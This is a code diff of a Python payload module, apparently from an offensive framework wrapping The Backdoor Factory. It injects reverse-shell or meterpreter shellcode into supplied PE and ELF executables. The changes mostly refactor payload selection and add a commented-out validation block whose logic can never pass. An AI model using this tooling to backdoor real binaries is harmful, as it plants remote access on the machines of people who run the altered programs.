@@ -55,7 +55,7 @@ class Payload:
         else:
             raise IOError
             print "\nBDF only supports intel 32/64bit PE and ELF binaries\n"
-            raw_input("\n[>] Press any key to return to the main menu:")
+            raw_input("\n[>] Press any key to return to the main menu.")
             self.type = ""
 
     def generate(self):
@@ -66,9 +66,36 @@ class Payload:
         #Make sure the bin is supported
         self.basicDiscovery()
 
-        if self.required_options['PAYLOAD'][0] == "custom":
+        shellcodeChoice = self.required_options['PAYLOAD'][0]
+        #cave_miner_inline
+        #iat_reverse_tcp_inline
+        #iat_reverse_tcp_inline_threaded
+        #iat_reverse_tcp_stager_threaded
+        #iat_user_supplied_shellcode_threaded
+        #meterpreter_reverse_https_threaded
+        #reverse_shell_tcp_inline
+        #reverse_tcp_stager_threaded
+        #user_supplied_shellcode_threaded
+        #if self.type == 'PE':
+        #    if not (shellcodeChoice == 'meterpreter_https' and shellcodeChoice == 'meter_https'
+        #        and shellcodeChoice == 'meterpreter_tcp'  and shellcodeChoice == 'meter_tcp'
+        #        and shellcodeChoice == 'reverse_shell'  and shellcodeChoice == 'rev_shell'
+        #        and shellcodeChoice == 'custom'):
+        #            print helpers.color("\n [*] Invalid payload: %s..." % shellcodeChoice, warning=True)
+        #            return ""
+        #elif self.type == 'ELF':
+        #    if not (shellcodeChoice == 'meterpreter_tcp'  and shellcodeChoice == 'meter_tcp'
+        #        and shellcodeChoice == 'reverse_shell'  and shellcodeChoice == 'rev_shell'
+        #        and shellcodeChoice == 'custom'):
+        #            print helpers.color("\n[*] Invalid payload: %s..." % shellcodeChoice, warning=True)
+        #            return ""
+        #else:
+        #    print helpers.color("\n[*] Invalid type: %s..." % self.type, warning=True)
+        #    return ""
 
-            Shellcode = self.shellcode.generate()
+        if shellcodeChoice == "custom":
+
+            Shellcode = self.shellcode.generate(self.required_options)
 
             raw = Shellcode.decode("string_escape")
             with open(settings.TEMP_DIR + "shellcode.raw", 'wb') as f:
@@ -78,19 +105,20 @@ class Payload:
             #invoke the class for the associated binary
             if self.type == 'PE':
                 targetFile = pebin.pebin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe',
-                                         SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw",
-                                         PATCH_METHOD=self.required_options["PATCH_METHOD"][0])
+                                        SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw",
+                                        PATCH_METHOD=self.required_options["PATCH_METHOD"][0])
+
                 self.extension = "exe"
+
             elif self.type == 'ELF':
-                targetFile = elfbin.elfbin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
+                targetFile = elfbin.elfbin(FILE=self.required_options["ORIGINAL_EXE"][0], OUTPUT='payload.exe',
+                                            SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
                 self.extension = ""
             else:
                 print "\nInvalid File or File Type Submitted, try again.\n"
                 return ""
 
         else:
-
-            shellcodeChoice = self.required_options['PAYLOAD'][0]
 
             # invoke the class for the associated binary
             if self.type == 'PE':
@@ -117,7 +145,7 @@ class Payload:
         except:
             #I use sys.exits in BDF, so not to leave Veil
             print "\nBackdoorFactory Error, check options and binary\n"
-            raw_input("\n[>] Press any key to return to the main menu:")
+            raw_input("\n[>] Press any key to return to the main menu.")
             return ""
         #Because speed
         time.sleep(3)
@@ -129,7 +157,7 @@ class Payload:
 
         except IOError:
             print "\nError during The Backdoor Factory execution\n"
-            raw_input("\n[>] Press any key to return to the main menu:")
+            raw_input("\n[>] Press any key to return to the main menu.")
             return ""
 
         try:
